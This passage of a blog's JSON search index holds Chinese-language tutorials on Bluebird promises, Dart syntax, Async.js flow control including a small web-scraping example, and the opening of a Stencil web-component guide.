&#125;&#125;);","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://me.lizhooh.com/tags/JavaScript/"}]},{"title":"比原生 Promise 更优雅的『蓝鸟』","slug":"Nodejs/比原生 Promise 更优雅的『蓝鸟』","date":"2018-06-01T01:08:39.000Z","updated":"2021-06-15T06:10:52.845Z","comments":true,"path":"/stories/2018/06/Nodejs/比原生 Promise 更优雅的『蓝鸟』/","link":"","permalink":"http://me.lizhooh.com/stories/2018/06/Nodejs/比原生 Promise 更优雅的『蓝鸟』/","excerpt":"前言Promise 是 JavaScript 开发中的一个重要概念。按照 Promises/A+ 规范的定义，Promise 表示的是一个异步操作的最终结果。ES6 规范里虽然提供了 Promise，但是对 Promise 提供的功能仅少。 Bluebird 是另外的 Promise 实现库，它没有使用原生的 Promise，而是自己建立的一套 Promise 机制，使得更加的高效。","text":"前言Promise 是 JavaScript 开发中的一个重要概念。按照 Promises/A+ 规范的定义，Promise 表示的是一个异步操作的最终结果。ES6 规范里虽然提供了 Promise，但是对 Promise 提供的功能仅少。 Bluebird 是另外的 Promise 实现库，它没有使用原生的 Promise，而是自己建立的一套 Promise 机制，使得更加的高效。 Bluebird 相对于原生的 Promise 有以下特点：同步检查，并发协调，Promise 转换，可调试性和错误处理，资源管理，取消和超时，原型作用域，承诺监测，异步/等待。 基本使用Bluebird 的使用就是把它取代了原生的 Promise，使用方式和原生的 Promise 差不多。 12const Promise = require('bluebird');new Promise(rs =&gt; setTimeout(rs, 1000)); 与原生 Promise 不同的是，Bluebird 还有 finally 的类型。 1Promise.then().catch().finally(); 还有 spread()，与 then 作用一样，唯一不同的是能把返回的数组打平为参数列表。 1Promise.resolve([1, 2, 3]).spread((v1, v2, v3) =&gt; console.log(v1 + v2 + v3)); 在 Bluebird 里有一个很好用的 Promise 转换 API，只要函数的结构符合 Nodejs 回调函数结构，那么就可以把 Nodejs 回调 API 转换成 Promise 形式。 转换之后，保留原来的 API，在命名基础上添加 Async 作为 Promise API。 1234567const Promise = require('bluebird');const fs = require('fs');Promise.promisifyAll(fs);fs.readFileAsync('./a.txt', 'utf-8') .then(data =&gt; console.log(data)) .catch(err =&gt; console.error(err)); 还有单个 API 的：Promise.promisify。 检查Bluebird 提供了几个 is 的方法用于检查 Promise 的状态。 1234567const p = new Promise(rs =&gt; setTimeout(rs, 1000));p.isFulfilled(); // 是否完成p.isRejected(); // 是否拒绝p.isPending(); // 是否处理中p.isCancelled(); // 是否取消p.value(); // 只有在 resolve 后才有p.reason(); // 失败原因 集合Bluebird 提供了需要用于集合操作的 API。例如：all、props、any、map、some、reduce、filter、each、mapSeries、race 等，这些异步迭代函数都会因错误而中断。 Promise.all 与 Promise.props 类似，all 返回的是一个顺序数组，而 props 则附加在对象 key 上面。 1234567Promise.props(&#123; pictures: getPictures(), comments: getComments(), tweets: getTweets()&#125;).then(function(&#123; pictures, comments, tweets &#125;) &#123; // ...&#125;); Promise.any 在执行任意一个成功后就会返回，类似于 Promise.race。 Promise.map 是一个异步迭代函数，类似于 all。 12345678910111213141516171819const wait = time =&gt; new Promise(rs =&gt; setTimeout(rs, time));console.time('run');Promise.map([500, 700, 900], async i =&gt; &#123; console.time(i); await wait(i); console.timeEnd(i); return i + 1;&#125;).then(res =&gt; &#123; console.timeEnd('run'); console.log(res);&#125;);/* 500: 500.930ms 700: 700.544ms 900: 900.503ms run: 903.224ms [ 501, 701, 901 ]*/ 对于其他：filter、some、reduce、filter、each 等使用类似。 Promise.mapSeries 类似于 map。对于 map 来说，它的执行是并行异步的，而 mapSeries 的执行是顺序异步执行。 12345678910111213141516171819const wait = time =&gt; new Promise(rs =&gt; setTimeout(rs, time));console.time('run');Promise.mapSeries([500, 700, 900], async i =&gt; &#123; console.time(i); await wait(i); console.timeEnd(i); return i + 1;&#125;).then(res =&gt; &#123; console.timeEnd('run'); console.log(res);&#125;);/* 500: 501.389ms 700: 700.087ms 900: 900.638ms run: 2106.247ms [ 501, 701, 901 ]*/ 在 map 里有一个配置项是可以控制并发数量的。 12345678910console.time('run');Promise.map([...new Array(10)].map(i =&gt; Math.random() * 1000 | 0), async i =&gt; &#123; console.time(i); await wait(i); console.timeEnd(i); return i + 1;&#125;, &#123; concurrency: 3 &#125;).then(res =&gt; &#123; console.timeEnd('run'); console.log(res);&#125;); 资源管理在异步操作中，合理的使用和优化资源是非常困难的。 Bluebird 提供了以下两个方法，让我们合理的优化和释放资源： promise.disposer - 为对象资源提供一个包装和释放方法。 Promise.using - 使用资源，并会自动调用资源的 disposer 释放方法的函数。 资源释放器以 Disposer 对象表示，通过 Promise 的 disposer 方法来创建。创建时的参数是一个用来释放资源的方法。该方法的第一个参数是资源对象，第二个参数是 Promise.using 产生的 Promise 对象。Disposer 对象可以传递给 Promise.using 来保证其资源释放逻辑被执行。 1234567891011121314151617181920class DB &#123; connect() &#123; return Promise.resolve(this); // 创建连接 &#125; query() &#123; return Promise.resolve('query'); &#125; close() &#123; console.log('close'); &#125;&#125;// 在所有 promise 结束后会自动调用 disposer。Promise.using( new DB().connect().disposer(db =&gt; db.close()), db =&gt; &#123; const data = db.query(); // ... &#125;,); 定时器Bluebird 提供了两个定时器，可以用来做一些定时功能。 Promise.delay - 返回指定时间后的 promise。 Promise.timeout - 为 promise 添加超时功能。 1234567// 一秒后，输出 helloPromise.delay(1000, 'hello').then(console.log);Promise.delay(1000, 'hello') .timeout(500, 'timed out') .then(console.log) // timed out，（1000 &gt; 500） .catch(console.error); 错误处理虽然可以使用 Promise 的 catch 来捕获错误并进行处理，在很多情况下，由于程序本身或第三方库的问题，仍然可能出现错误没有被捕获的情况。未捕获的错误可能导致 NodeJS 进程意外退出。Bluebird 提供了全局和本地两种错误处理机制。Bluebird 会触发与 Promise 被拒绝相关的全局事件，分别是 unhandledRejection 和 rejectionHandled。 1234567Promise .reject(new TypeError('error')) .then(console.log);process.on('unhandledRejection', reason =&gt; &#123; console.error(`unhandled $&#123;reason&#125;`)&#125;); 参考资料 http://bluebirdjs.com/docs/getting-started.html","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Dart 从『未听说过』到『听说过』","slug":"Flutter/Dart 从『未听说过』到『听说过』","date":"2018-05-24T01:36:51.000Z","updated":"2021-06-15T06:10:52.815Z","comments":true,"path":"/stories/2018/05/Flutter/Dart 从『未听说过』到『听说过』/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/Flutter/Dart 从『未听说过』到『听说过』/","excerpt":"前言在大一的时候，买了一本《xxx 从入门到精通》的书看，等我看完之后发现根本连门都没找到，各种坑，大量的示例与抄文档无异，简直就是欺骗消费者。再后来再也没有买过这种破系列书，养成看文档的习惯。 Dart 有很多语法都是类似 ES6 的，下面列出了一些类比的语法。","text":"前言在大一的时候，买了一本《xxx 从入门到精通》的书看，等我看完之后发现根本连门都没找到，各种坑，大量的示例与抄文档无异，简直就是欺骗消费者。再后来再也没有买过这种破系列书，养成看文档的习惯。 Dart 有很多语法都是类似 ES6 的，下面列出了一些类比的语法。 简述谷歌于 2011 年 10 月 10 日发布了网络编程语言 Dart 的“早期预览版”。谷歌希望利用这款语言，帮助程序开发者克服 JavaScript 语言的缺点。 然而 Typescript 出现之后，Dart 就失去了天然的优势。 数据类型在 Dart 里是强类型的，也有自动推断类型的机制。 12345678910111213141516171819202122232425262728293031// 导入方式import 'dart:math';import 'dart:async';// 基本类型var name = 'Voyager I';var antennaDiameter = 3.7;const image = &#123; 'tags': ['Jupiter', 'Saturn', 'Uranus', 'Neptune'], 'url': '//path/to/saturn.jpg'&#125;;// 函数类型String sayHello(var name) &#123; return 'Hello $name!';&#125;// 箭头函数var add = (a, b) =&gt; a + b;// 类似 PromiseFuture sum(num a, num b) async &#123; return await add(a, b);&#125;// main 函数void main() async &#123; print(sayHello(name)); // Hello Voyager I! print(max(1, 2)); // 2 sum(1, 2).then((res) =&gt; print(res)); // 3 （类似 Promise）&#125; Dart 在声明时有以下几个基本类型：number、string、boolean、list、map、rune、symbol。 123456789101112131415161718192021int x = 1;double y = 1.1;num z = 1.2;String x = 'abc';enum Color &#123; red, green, blue &#125;; // 枚举类型const msPerSecond = 1000;bool flag = false;var list = [1, 2, 3];List arr = [1, 2, 3];List&lt;String&gt; names = ['a', 'b', 'c']; // 泛型var constantList = const [1, 2, 3];var gifts = &#123; 'first': 'partridge', 'second': 'turtledoves', 'fifth': 'golden rings'&#125;;Map nobleGases = const &#123; 2: 'helium', 10: 'neon', 18: 'argon',&#125;; 函数Dart 的函数支持函数声明、函数字面量、箭头函数、函数表达式、匿名函数。 1234567891011121314151617181920212223242526272829303132333435int add(int a, int b) &#123; return a + b;&#125;// 类型可省略add(a, b) &#123; return a + b;&#125;// 箭头函数var add = (a, b) =&gt; a + b;int add(int a, int b) =&gt; a + b;// 可选参数，使用 [] 限定int add(int a, int b, [int c = 1, int d = 2]) =&gt; a + b + c + d;// 显示指定参数名称，默认参数int add(&#123; int a = 1, int b = 2 &#125;) &#123; return a + b;&#125;add(a: 1, b: 2);// 回调函数var list = ['apples', 'bananas', 'oranges'];list.forEach((item) &#123; print('$&#123;list.indexOf(item)&#125;: $item');&#125;);// 回调 + 箭头list.forEach((item) =&gt; print(item));// 闭包Function makeAdder(int addBy) &#123; return (int i) =&gt; addBy + i;&#125; 注意：函数不存在函数提升。 操作符操作符包括了：expr++、expr--、()、[]、.、?. 等，基本和 ES6 一致，除了没有 === 的判断。 例外有三个特色的操作：is、as、is?。 is 用于判断类型，as 用于续言、is? 与 is 相反。 123456if (emp is Person) &#123; // Type check emp.firstName = 'Bob';&#125;(emp as Person).firstName = 'Bob'; 级联符号（..）：允许您在同一个对象上进行一系列操作。除了函数调用之外，还可以访问同一对象上的字段。这通常会为您节省创建临时变量的步骤，并允许您编写更流畅的代码。 1234567891011121314151617181920var gifts = &#123; 'first': 'partridge', 'second': 'turtledoves', 'fifth': 'golden rings'&#125;;getGifts() &#123; return gifts;&#125;// 不使用级联符号var g = getGifts();g.first = 1;g.second = 2;g.fifth = 3;// 使用级联符号getGifts() ..first = 1 ..second = 2 ..fifth = 3; 级联符号对于时引用操作的是非常有用。 控制流程Dart 的控制流程支持：if、if-else、for、while、do-while、switch、try-catch-finally、 1234567891011121314151617if (isRaining()) &#123; // ...&#125; else if (isSnowing()) &#123; // ...&#125; else &#123; // ...&#125;var message = new StringBuffer('Dart is fun');for (var i = 0; i &lt; 5; i++) &#123; message.write('!');&#125;var collection = [0, 1, 2];for (var x in collection) &#123; print(x); // 0 1 2&#125; 类结构Dart 的类支持继承、静态方法、接口、构造函数、重载操作符、抽象类、接口类、 mixins等。 Dart 的类不支持什么 public、private 这些。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748class X &#123; num x, y; X(x, y) &#123; this.x = x; this.y = y; &#125; void say() &#123; print(this.x + this.y); &#125;&#125;class Point extends X &#123; num x; num y; final int k = 1; // 无法被实例修改值 static const int initialCapacity = 16; // 静态常量 // 静态方法 static add() &#123; // ... &#125; // 构造函数，用 :super(arg) 调用父类的构造函数 // 等效 =&gt; Point(this.x, this.y): super(x, y); Point(num x, num y): super(x, y) &#123; super.say(); // 调用父类的方法 this.x = x; this.y = y; &#125; // 命名构造函数（觉得构造函数长的丑，也可以命名哦） // var p = new Point.origin(); Point.origin() &#123; x = 0; y = 0; &#125; // getter、setter 函数 get xx =&gt; this.x; set xx(v) =&gt; this.x = xx; // 重写父类的方法，其实不佳 @override 也可以 @override void say() &#123; // ··· &#125;&#125; Dart 还支持重载操作符。 12345678910111213141516// 重载操作符class Vector &#123; final int x, y; const Vector(this.x, this.y); /// Overrides + (a + b). Vector operator +(Vector v) &#123; return new Vector(x + v.x, y + v.y); &#125; /// Overrides - (a - b). Vector operator -(Vector v) &#123; return new Vector(x - v.x, y - v.y); &#125;&#125; Dart 中的实现接口类。 1234class Impostor implements Person &#123; get _name =&gt; ''; String greet(String who) =&gt; 'Hi $who. Do you know who I am?';&#125; Dart 能支持 mixins，使用 with 关键字。 123class Musician extends Performer with Musical &#123; // ···&#125; 泛型Dart 支持泛型哦。 1234567891011121314151617181920212223var names = &lt;String&gt;['Seth', 'Kathy', 'Lars'];var pages = &lt;String, String&gt;&#123; 'index.html': 'Homepage', 'robots.txt': 'Hints for web robots', 'humans.txt': 'We are people, not machines'&#125;;var names = new List&lt;String&gt;();names.addAll(['Seth', 'Kathy', 'Lars']);names.add(42); // Errorprint(names is List&lt;String&gt;); // true// 泛型函数T first&lt;T&gt;(List&lt;T&gt; ts) &#123; T tmp = ts[0]; return tmp;&#125;// 泛型类abstract class Cache&lt;T&gt; &#123; T getByKey(String key); void setByKey(String key, T value);&#125; 模块Dart 的模块导入。 1234567891011121314151617// 全部导入，并且是全局变量import 'dart:math';max(1, 2);// 别名import 'dart:math' as math;math.max(1, 2);// 只导入部分import 'dart:math' show min;min(1, 2);// 懒加载，类似 ES6 的 import()import 'dart:math' deferred as math;Future greet() async &#123; await math.max(1, 2);&#125; 导出模块，创建一个 myMath.dart 文件。 1234567int max(int a, int b) &#123; return a &gt; b ? a : b;&#125;int _min(int a, int b) &#123; return a &lt; b ? a : b;&#125; Dart 的导出默认是带下划线为私有，其他为公有。 123import './myMath.dart' as math;math.max(1, 2); 异步在 ES6 与异步相关的就是 Promise、async、await。而在 Dart 则是 Future、async、await。 Dart库充满了返回 Future 或 Stream 对象的函数。这些功能是异步的：它们在设置可能耗时的操作（例如 I/O）之后返回，而不等待该操作完成。在 async 和 await 关键字支持异步编程，让你写异步代码看起来类似于同步代码。 使用 async/await 之前需要引入 dart:async 模块。 123456789import 'dart:async';Future&lt;String&gt; lookUpVersion() async =&gt; '1.0.0';Future main() async &#123; await for (var request in requestServer) &#123; handleRequest(request); &#125;&#125; 参考资料 https://www.dartlang.org/guides/language/language-tour","categories":[{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/categories/Flutter/"}],"tags":[{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/tags/Flutter/"},{"name":"Dart","slug":"Dart","permalink":"http://me.lizhooh.com/tags/Dart/"}]},{"title":"使用『Async』进行异步并发流程控制","slug":"Nodejs/使用『Async』进行异步并发流程控制","date":"2018-05-22T03:14:42.000Z","updated":"2021-06-15T06:10:52.843Z","comments":true,"path":"/stories/2018/05/Nodejs/使用『Async』进行异步并发流程控制/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/Nodejs/使用『Async』进行异步并发流程控制/","excerpt":"前言Javascript 是一门单线程的编程语言，在 Javascript 里异步几乎是一个随处可见的场景，异步并发流程的控制似乎比想象中要困难。 Async.js 就像它的名字一样，是一个用于控制、管理异步并发的库，提供了大量有助于控制异步并发流程的工具函数。Async 能运行在所有 Javascript 运行环境里（浏览器、Nodejs、React Native、微信小程序等），它的实现是纯 Javascript 实现。Async.js 非常火，在 npm 已经到达了千万下载量，几乎在复杂的业务场景里都会使用到 Async.js（还有一个类似的库：neo-async）。","text":"前言Javascript 是一门单线程的编程语言，在 Javascript 里异步几乎是一个随处可见的场景，异步并发流程的控制似乎比想象中要困难。 Async.js 就像它的名字一样，是一个用于控制、管理异步并发的库，提供了大量有助于控制异步并发流程的工具函数。Async 能运行在所有 Javascript 运行环境里（浏览器、Nodejs、React Native、微信小程序等），它的实现是纯 Javascript 实现。Async.js 非常火，在 npm 已经到达了千万下载量，几乎在复杂的业务场景里都会使用到 Async.js（还有一个类似的库：neo-async）。 异步模型异步它不同于“同步”，不常规的理解它好比飞起来的蒲公英。常见的异步并发流程模型就像电路一样：单一的串联、单一的并联、单并联混合。 单一的串联：当进行有依赖性的数据库操作时，比如先到 redis 里读取用户 id，再从 mongodb 里读取用户详细数据。 1234+ async function () &#123; const id = await redis.get(cookie); const data = await User.find(&#123; _id: id &#125;);&#125; (); 单一的并联：两个数据库操作不产生依赖性。 1234567+ async function () &#123; const id1 = 1, id2 = 2; const [data1, data2] = await Promise.all([ User.find(&#123; _id: id1 &#125;), User.find(&#123; _id: id2 &#125;), ]);&#125; (); 单并联混合：几个数据库操作，又有依赖性，又有无依赖性。 123456789+ async function () &#123; const id1 = await redis.get(cookie1); const id2 = await redis.get(cookie2); const [data1, data2] = await Promise.all([ User.find(&#123; _id: id1 &#125;), User.find(&#123; _id: id2 &#125;), ]);&#125; (); 实际上当流程比较小时，是可以使用 Promise 来控制的，当流程复杂并且大的时候，使用 Promise 就会显得非常的无力（当然能做到很好）。 使用 AsyncAsync 它为 Javascript 异步编程提供了强有力的支持。 下面先来看一下一个异步并发控制的示例： 1234567891011121314151617181920212223242526const Async = require('async');const colors = require('colors');let count = 0;function fetchUrl(url, done) &#123; const delay = Math.random() * 1200 | 0; count++; console.log( `现在并发数 $&#123;(count + '').yellow&#125;`, `正在抓取的是 $&#123;url.yellow&#125;，耗时 $&#123;(delay + '').yellow&#125; 毫秒` ); + async function () &#123; await new Promise(rs =&gt; setTimeout(rs, delay)); count--; done(null, url); &#125;();&#125;;const urls = [...new Array(20)].map((_, i) =&gt; 'http://www.abc.com/list/' + i);Async.mapLimit(urls, 5, fetchUrl, (err, result) =&gt; &#123; console.log('final:'); console.log(result);&#125;); 说明：Async.mapLimit 是一个并发控制的函数，第一个参数为数据源，第二个参数为执行任务函数，第三个参数为处理结果，Async 的回调函数都是接受普通的函数，done 就是一个处理完成后的回调函数。 在默认情况下，为了获得最好的性能 Async 使用的回调函数的处理方式，同时它也支持 Promise。 1234567891011121314Async.mapLimit(urls, 5, async url =&gt; &#123; const delay = Math.random() * 1200 | 0; count++; await new Promise(rs =&gt; setTimeout(rs, delay)); console.log( `现在并发数 $&#123;(count + '').yellow&#125;`, `正在抓取的是 $&#123;url.yellow&#125;，耗时 $&#123;(delay + '').yellow&#125; 毫秒` ); count--; return url;&#125;, (err, result) =&gt; &#123; console.log('final:'); console.log(result);&#125;); 集合Async 提供了大量的集合操作方法。总体来说，有三个基本的命名方式即：each、eachSeries、eachLimit。 each 与 eachSeries 的区别是，Series 会因为错误而中断，就像 Promise.all 一样，而 Limit 是一个并发操作。 each(arr, iterator, callback): 遍历集合并做相同操作，不会因为错误而中断。 eachSeries(arr, iterator, callback): 遍历集合并做相同操作，会因为错误而中断。 eachLimit(arr, limit, iterator, callback): 并发遍历操作，limit 是最大并发量，会因为错误而中断。 123456Async.each([1, 2, 3, 4, 5, 6, 7, 8], (item, cb) =&gt; &#123; item === 4 ? cb('is ' + item) : cb(); console.log(item);&#125;, err =&gt; &#123; console.info('error==&gt;' + err);&#125;); 同理，还有 map、filter、reject（filter 的反操作）、reduce、reduceRight、detect（与 filter 类型，只取第一个结果）、some、every、concat 等集合函数。 注意：callback 的参数为 (err, result)。如果 callback 第一个参数布尔值不为 false，则会触发错误。 控制流Async.series 是顺序执行（串联）多个函数的，会按照队列的元素顺序执行，并且发生错误时，不回调后面的。 1234567891011121314151617Async.series([ done =&gt; &#123; console.log('A'); // =&gt; A done(null, 1); &#125;, done =&gt; &#123; console.log('B'); // =&gt; B done(&#123; message: \"some error\" &#125;, 2); &#125;, done =&gt; &#123; console.log('C'); // =&gt; C done(null, 3); &#125;], (err, results) =&gt; &#123; err &amp;&amp; console.error(\"error happend: \", err); console.log(results); // [1, 2]&#125;); Async.parallel 是并行执行（并联）多个函数的，每个函数都是立即执行，不需要等待其它函数先执行，同样发生错误时，不回调后面的。 1234567891011121314151617Async.parallel([ done =&gt; &#123; console.log('A'); // =&gt; A done(null, 1); &#125;, done =&gt; &#123; console.log('B'); // =&gt; B done(&#123; message: \"some error\" &#125;, 2); &#125;, done =&gt; &#123; console.log('C'); // =&gt; C done(null, 3); &#125;], (err, results) =&gt; &#123; err &amp;&amp; console.error(\"error happend: \", err); console.log(results); // [1, 2]&#125;); Async.queue 是一个任务队列，异步执行，可以设置统一时刻允许异步执行任务的并发数。 1234567891011121314151617181920212223242526// 创建一个异步队列，并且并发限制为 2const q = Async.queue((task, done) =&gt; &#123; console.log(task.name); done();&#125;, 2);// 全部完成q.drain = () =&gt; console.log('全部完成');q.push(&#123; name: 'foo' &#125;, err =&gt; console.log('这里是 done'));q.push(&#123; name: 'bar' &#125;);// 可以一次性添加多个q.push([&#123; name: 'baz' &#125;, &#123; name: 'bay' &#125;, &#123; name: 'bax' &#125;]);// 最先被执行q.unshift(&#123; name: 'bat' &#125;, err =&gt; console.log('unshift'));/* bat unshift foo 这里是 done bar baz bay bax 全部完成*/ 用来处理有依赖关系的多个任务的执行。比如某些任务之间彼此独立，可以并行执行；但某些任务依赖于其它某些任务，只能等那些任务完成后才能执行。 例如一系列的操作：A、B、C、D、E。A 与 B 无依赖，可以并行，而 C、E 则需要等 A、B 完成后，E 则需要等 C、D 完成后。 1234567891011121314151617181920212223Async.auto(&#123; A: done =&gt; &#123; done(null, 'A'); &#125;, B: done =&gt; &#123; done(null, 'B'); &#125;, C: ['A', 'B', (res, done) =&gt; &#123; done(null, 'A + B =&gt; C'); &#125;], D: done =&gt; &#123; done(null, 'D'); &#125;, E: ['C', 'D', (res, done) =&gt; &#123; done(null, 'C + D =&gt; E'); &#125;]&#125;, (err, res) =&gt; &#123; console.log('err = ', err); console.log('result = ', res);&#125;);// err = null// result = &#123; A: 'A', B: 'B', D: 'D', C: 'A + B =&gt; C', E: 'C + D =&gt; E' &#125; Async.whilst 类似于 while，当 callback 返回 false 或者发生错误时停止。第一个参数就是 while 的条件，第二个参数是 while 的执行内容。 12345678910111213141516171819let count = 0;Async.whilst(() =&gt; &#123; console.info('111 ==&gt; ' + count); return count &lt; 2;&#125;, done =&gt; &#123; console.info('222 ==&gt; ' + count); count++; setTimeout(done, 1000);&#125;, err =&gt; &#123; console.log(err);&#125;);/* 111 ==&gt; 0 222 ==&gt; 0 111 ==&gt; 1 222 ==&gt; 1 111 ==&gt; 2 null*/ 类似的： whilst -&gt; doWhilst（do while） until -&gt; doUntil whilst 与 until 是相反关系。 Async.forever 循环执行一个函数，直到抛出错误。 1234567Async.forever(done =&gt; &#123; setTimeout(() =&gt; &#123; flag++ &gt; 5 ? done(&#123; message: \"hello\" &#125;) : done(); &#125;, 1000);&#125;, err =&gt; &#123; err &amp;&amp; console.error(\"there is an error\", err);&#125;); Async.compose 将几个函数组合成一个函数。例如：a(b(c()))。 1Async.compose(a, b, c); // a(b(c())) Async.times 与 Async.map 类似，不同的是 Async.times 有一个累计的数值。 123456Async.times(5, (n, next) =&gt; &#123; console.log(n); next(null, n);&#125;, (err, results) =&gt; &#123; console.log(results); // [1, 2, 3, 4, 5];&#125;); 还是 Async.timesLimit、Async.timesSeries。 Async.retry 会在错误时，重新执行任务，如果没有错误，则只执行一次。重试次数默认为 5。 123456Async.retry(3, (cb, result) =&gt; &#123; console.log(new Date()); cb(true);&#125;, (err, result) =&gt; &#123; // ...&#125;); 工具函数列出常用的工具函数： Async.memoize 会让某一个函数在内存中缓存它的计算结果。 Async.reflect 将一个函数封装在里面，该函数保持成功的状态。在 value 里保存完成的值，在 error 里保存错误信息。 123456789101112131415161718Async.parallel([ Async.reflect(done =&gt; &#123; done(null, 'one'); &#125;), Async.reflect(done =&gt; &#123; done('bad stuff happened'); // 抛一个错误，parallel 并没有打断。 &#125;), Async.reflect(done =&gt; &#123; done(null, 'two'); &#125;)], (err, results) =&gt; &#123; console.log(err); // null console.log(results); // values // results[0].value = 'one' // results[1].error = 'bad stuff happened' // results[2].value = 'two'&#125;); Async.race 类似于 Promise.race，第一个完成的会立即触发结束。 123456Async.race([ done =&gt; setTimeout(() =&gt; done(null, 'one'), 200), done =&gt; setTimeout(() =&gt; done(null, 'two'), 100),], (err, result) =&gt; &#123; // ...&#125;); 爬虫实战示例下面是使用 Async.js 来控制爬虫的异步并发流程示例，效果非常好。抓取的是小说阅读网的小说列表信息。其中使用到了我写的一个 auto-query 库，用于解析与获取 html 数据。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556const Async = require('async');const autoQuery = require('auto-query');const got = require('got');const colors = require('colors');const nextUrl = n =&gt; 'https://www.readnovel.com/all?pageNum=' + n;const point = (n, m) =&gt; (n * (10 ** m) | 0) / (10 ** m);const yellow = str =&gt; str.toString().yellow;const max = 100;const M = 30;let list = []; // 数据列表let alltime = 0;let count = 0;Async.timesLimit(max, M, (n, next) =&gt; &#123; count++; + async function () &#123; try &#123; const start = Date.now(); const html = (await got(nextUrl(n + 1))).body; list = list.concat(autoQuery(html, &#123; select: '.right-book-list &gt; ul &gt; li', data: [&#123; title: '$ .book-info &gt; h3 &gt; a', author: '$ .book-info .default', image: &#123; select: '.book-img img', data: '@src', &#125;, summary: &#123; select: '.book-info .intro', trim: true, &#125;, &#125;] &#125;)); const end = Date.now(); const time = end - start; alltime += time; // ... 完成当前任务 console.log( '当前并发量是：' + count--, '还剩余：' + yellow(max - n), '抓取到的数据量：' + yellow(list.length), '用时：' + yellow(point(time / M, 2)) + ' ms', '平均用时：' + yellow(point(alltime / M / n, 2)) + ' ms/page', ); // 执行下一个任务 next(null, n); &#125; catch (err) &#123; console.log(`page = $&#123;n&#125; 抓取失败：$&#123;err.message&#125;`.red); &#125; &#125;();&#125;); 运行效果： 那么，如如果出现错误如何处理？实际上可以把错误的 url 添加到 Set（集合）里面，再整个结束之后，再使用 Async.retry（重试）函数就像抓取，多次失败，那就不爬它了。 参考资料 https://caolan.github.io/async/","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Stencil：一个 Web Component 编译器","slug":"前端/Stencil：一个 Web Component 实现框架","date":"2018-05-20T06:22:02.000Z","updated":"2021-06-15T06:10:52.904Z","comments":true,"path":"/stories/2018/05/前端/Stencil：一个 Web Component 实现框架/","link":"","permalink":"http://me.lizhooh.com/stories/2018/05/前端/Stencil：一个 Web Component 实现框架/","excerpt":"前言Stencil 是一个神器可重用的 Web 组件编译器，由 Ionic Framework 团队创建，旨在帮助构建能够在所有主要框架中运行的更快，更强大的组件。","text":"前言Stencil 是一个神器可重用的 Web 组件编译器，由 Ionic Framework 团队创建，旨在帮助构建能够在所有主要框架中运行的更快，更强大的组件。 Stencil 它有以下的特点：Virtual DOM、异步渲染（受 React Fiber 启发）、响应式的数据绑定、Typescript、JSX。 开始Stencil 暂时没有搭手架，直接 clone 仓库下来。 1234git clone https://github.com/ionic-team/stencil-app-starter my-appcd my-appgit remote rm originnpm install 组件Stencil 的组件是支持 JSX 的，默认也是 JSX 形式。Stencil 的组件长的很像 React 的组件。 12345678910111213141516import &#123; Component, Prop, State &#125; from '@stencil/core';// 使用 @Component 装饰这个类@Component(&#123; tag: 'my-first-component', styleUrl: 'my-first-component.scss',&#125;)export class MyComponent &#123; @Prop() name: string; // 这是一个 props @State() title: string; // 这是一个 state render() &#123; // jsx 语法 return ( &lt;p&gt;My name is &#123;this.name&#125;&lt;/p&gt; ); &#125;&#125; 编译完成后，这个组件就可以像其他标签一样在HTML中使用 1&lt;My-first-component name=\"Max\"&gt;&lt;/My-first-component&gt; 生命周期组件有许多生命周期方法，可用于了解组件的加载过程。可以将这些方法添加到组件里，以在正确的时间挂钩到操作中。Stencil 的生命周期名称与 React 的类似。 123456789101112131415161718192021222324252627import &#123; Component &#125; from '@stencil/core';@Component(&#123; tag: 'my-component'&#125;)export class MyComponent &#123; // 组件加载前 componentWillLoad() &#123; console.log('Component is about to be rendered'); &#125; // 组件加载后 componentDidLoad() &#123; console.log('Component has been rendered'); &#125; // 组件更新前 componentWillUpdate() &#123; console.log('Component will update and re-render'); &#125; // 组件更新后 componentDidUpdate() &#123; console.log('Component did update'); &#125; // 组件卸载 componentDidUnload() &#123; console.log('Component removed from the DOM'); &#125;&#125; 与 React 生命周期不同的是，Stencil 的生命周期支持异步生命周期方法。当生命周期里返回一个 Promise 时，这个生命周期方法会等待这个 Promise 结束。 1234567componentWillLoad() &#123; return fetch('/some-data.json') .then(response =&gt; response.json()) .then(data =&gt; &#123; this.content = data; &#125;);&#125; 响应式数据Stencil 的数据是响应式更新的，当组件上的 props 或 state 改变时，组件会自动重新渲染。为了提高性能和简化性，Stencil 仅比较数据引用。在数组或对象中的数据更改时，它并不会重新渲染，当引用改变时才会重新渲染。 12345678910111213import &#123; Component, State &#125; from '@stencil/core';@Component(&#123; tag: 'my-component'&#125;)export class MyComponent &#123; @State() nums: number[] = [1, 2, 3]; componentDidLoad() &#123; this.nums.push(4); // 不会重新渲染 this.nums = [...this.nums, 5]; // 会重新渲染 &#125;&#125; 装饰器Stencil 里提供许多的装饰器来装饰组件。目前有几个主要的装饰器： @Component 装饰为组件。 @Prop 组件的属性，默认是不能从内部改变 props 的。 @State 组件的状态。 @Watch 在 props 或 state 变化时触发 @Method 组件的方法。 @Element 组件的元素。 @Event() 组件的事件。 @Listen() 用户监听组件的事件（也可以监听自定义的事件）。 12345678910111213141516171819202122232425262728293031323334353637383940414243import &#123; Prop, Watch, Element, Method, Event, Listen &#125; from 